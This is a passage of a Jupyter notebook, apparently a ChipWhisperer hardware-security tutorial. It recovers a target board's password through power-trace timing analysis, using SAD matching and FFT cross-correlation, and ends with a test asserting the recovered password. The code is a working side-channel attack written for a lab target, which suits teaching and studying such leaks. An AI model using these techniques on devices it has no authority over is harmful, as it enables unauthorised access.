    "For example, in the following trace, the black section doesn't shift in time, making it a poor choice. Meanwhile, the purple section does shift in time, but isn't unique: it's very likely that it will match with another part of the trace. The blue selection, however, is both unique and moves in time.\n",
    "![](img/password_ref_selection.png)\n",
    "\n",
    "Finally, selecting our reference:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%matplotlib inline\n",
    "import matplotlib.pyplot as plt\n",
    "plt.rcParams['figure.dpi'] = 130\n",
    "\n",
    "if PLATFORM == \"CWNANO\":\n",
    "    #There's a bit of jitter\n",
    "    ref = ref_trace[300:500]\n",
    "elif PLATFORM == \"CWLITEARM\" or PLATFORM == \"CW308_STM32F3\":\n",
    "    ref = ref_trace[770:1000]\n",
    "elif PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "    ref = ref_trace[110:265]\n",
    "elif PLATFORM == \"OpenTitan\":\n",
    "    ref = ref_trace[80:500]\n",
    "    ref_cor = ref_correct[80:500]\n",
    "\n",
    "if ref is not None: \n",
    "    fig = plt.figure()\n",
    "    fig.suptitle('Reference of incorrect guess')\n",
    "    plt.plot(ref, c='orangered', label=text_ref)\n",
    "    plt.plot(ref_cor, c='blue', label=text_ref_cor)\n",
    "    plt.legend(loc=\"upper left\")\n",
    "    plt.xlabel('Samples')\n",
    "    plt.grid()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As a quick test, we should try the SAD match on another incorrect guess as well as the original reference trace: they should both have the same offset here. This also gives us a good opportunity to find a good threshold. If the threshold is too high, the trace will match early. If it's too low, it won't match at all:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "trace = cap_pass_trace(\"b\\n\")\n",
    "offset1 = find_offset_SAD(ref, ref_trace, 6)\n",
    "offset2 = find_offset_SAD(ref, trace, 6)\n",
    "\n",
    "# if offset1 != offset 2, assert will complain\n",
    "assert offset1 == offset2, \"Mismatched offsets for incorrect guesses. Adjust threshold or choose a different reference\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now let's see if we can guess a correct character using this technique. If the offset is higher than what we get from the reference trace, we know we've got a correct character:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [],
    "hidden": true
   },
   "outputs": [],
   "source": [
    "original_offset = find_offset_SAD(ref, ref_trace, 6)\n",
    "print(\"original offset: \", original_offset)\n",
    "guesslist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "\n",
    "#Guess first character of password\n",
    "with tqdm(total=len(guesslist), file=sys.stdout) as pbar:\n",
    "    for c in guesslist:\n",
    "        pbar.set_description('process ' + mColors.BOLD + c + mColors.ENDC)\n",
    "        pbar.update(1)\n",
    "        next_pass = c + \"\\n\"\n",
    "        trace = cap_pass_trace(next_pass)\n",
    "        offset = find_offset_SAD(ref, trace, 6)\n",
    "        if offset is None:\n",
    "            print(\"Threshold likely too low\")\n",
    "            break\n",
    "        elif offset == 0:\n",
    "            print(\"Threshold likely too high\")\n",
    "            break\n",
    "        if offset > offset1:\n",
    "            print(\"\\n\")\n",
    "            print(\"character guessed: \" + mColors.BOLD + c + mColors.ENDC)\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Extending this to the rest of the password isn't too hard either. Simple iterate through all the characters. Again try writing this code yourself. One caveat here is that this technique will likely fail on the last password, since the part of the trace we're checking won't occur if we guess the password correctly. To work around this, we can simply check the response to see if we've got the whole password correct using `target.read()`. Again, if you're really stuck, a working guess function can be found in `PA_SPA_1_answers.py`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from importlib import reload \n",
    "reload(OpenTitan.PA_SPA_1_answers)\n",
    "#def guess_password_SAD_OpenTitan(cap_pass_trace, find_offset, ref, original_offset, threshold, target, PW_LEN):\n",
    "from OpenTitan.PA_SPA_1_answers import guess_password_SAD_OpenTitan\n",
    "original_offset = find_offset_SAD(ref, ref_trace, 8)\n",
    "password = guess_password_SAD_OpenTitan(cap_pass_trace, find_offset_SAD, ref, original_offset, 8, target, PW_LEN)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "With that, you should now have successfully broken the password again! Keep in mind that this is just one application of the SAD match: for example, it's quite useful for resynchronizing traces if random jitter is used as a countermeasure against side channel attacks, as is the case in tutorial `PA_CPA_3`. It is also available as a powerful trigger for the CW1200 Pro - in a typical target, we might not have access to a simple IO pin to trigger off of.\n",
    "\n",
    "Keep in mind that this is just one of many possible ways to perform this attack - a similar one is performed in PA_Multi_1 using correlation instead of SAD. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack via cross-correlation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First we define a cross-correlation function that returns a value how much signal2 is shifted compared to signal1. Therefore, we use FFT function from scipy and numpy's argmax. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from scipy.fft import fft, fftfreq, fftshift, ifft\n",
    "from scipy import signal\n",
    "\n",
    "def find_timeshift(signal1, signal2):\n",
    "    sig1_f = fft(signal1)\n",
    "    sig2_f = fft(signal2)\n",
    "    sig1_fc = -sig1_f.conjugate()\n",
    "    Z = ifft(sig1_fc*sig2_f)\n",
    "    shift = np.argmax(np.abs(Z))\n",
    "    return shift"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack the first character of the password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# run this if you change the password\n",
    "build_software() \n",
    "\n",
    "# record traces\n",
    "scope.adc.samples = 800\n",
    "\n",
    "trace_start = cap_pass_trace(\"\\x00\\n\") # start from an incorrect guess, null-byte not in password\n",
    "original_shift = find_timeshift(trace_start, trace_start)\n",
    "shift = -1\n",
    "guesslist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "with tqdm(total=len(guesslist), file=sys.stdout, leave=True) as pbar:\n",
    "    for c in guesslist:\n",
    "        pbar.set_description('process ' + mColors.BOLD + c + mColors.ENDC + \" | shift: \" + str(shift), refresh=True)\n",
    "        pbar.update(1)\n",
    "        next_pass = c + \"\\n\"\n",
    "        trace = cap_pass_trace(next_pass)\n",
    "        shift = find_timeshift(trace[50:600], trace_start[50:600])\n",
    "        if shift is not None:\n",
    "            if shift > (original_shift):\n",
    "                print(\"\\n\")\n",
    "                print(\"character guessed: \" + mColors.BOLD + c + mColors.ENDC)\n",
    "                break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack the entire password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [],
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "%%time\n",
    "from timeit import default_timer as timer\n",
    "\n",
    "# run this if the the password on target changed\n",
    "build_software() \n",
    "\n",
    "trace_start = cap_pass_trace(\"\\x00\\n\") # start from an incorrect guess, null-byte not in password\n",
    "def guess_password_CORR_OpenTitan():\n",
    "    original_shift = find_timeshift(trace_start, trace_start)\n",
    "    shift = original_shift\n",
    "    guesslist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "    password = \"\"\n",
    "    for i in range(PW_LEN):\n",
    "        with tqdm(total=len(guesslist), file=sys.stdout, leave=False) as pbar:\n",
    "            for c in guesslist:\n",
    "                pbar.set_description('process ' + mColors.BOLD + c + mColors.ENDC + \" | shift: \" + str(shift), refresh=True)\n",
    "                pbar.update(1)\n",
    "                next_pass = password + c + \"\\n\"\n",
    "                trace = cap_pass_trace(next_pass)\n",
    "                time.sleep(0.01)\n",
    "                success_resp = \"Access granted, Welcome!\"\n",
    "                resp = target.read()\n",
    "                response = str(resp, 'utf-8', errors='ignore')\n",
    "                if \"granted\" in response:\n",
    "                    print(\"\\n\")\n",
    "                    print(mColors.CORG + \"Access granted: password = \" + mColors.BOLD + next_pass + mColors.ENDC)\n",
    "                    return next_pass\n",
    "                shift = find_timeshift(trace_start[100:600], trace[100:600])\n",
    "                if shift is not None:\n",
    "                    if shift > original_shift:\n",
    "                        password += c\n",
    "                        print(\"\\n\")\n",
    "                        print(\"Success, password now: \" + mColors.BOLD + password + mColors.ENDC)\n",
    "                        original_shift = shift\n",
    "                        break\n",
    "    return password\n",
    "                    \n",
    "password = guess_password_CORR_OpenTitan().strip('\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Conclusion"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This tutorial has demonstrated the use of the simple power side-channel analysis for performing timing attacks. Three techniques were used to break a password with a timing vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert (password == \"h0px3\"), \"Failed to break password, got {}.\".format(password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
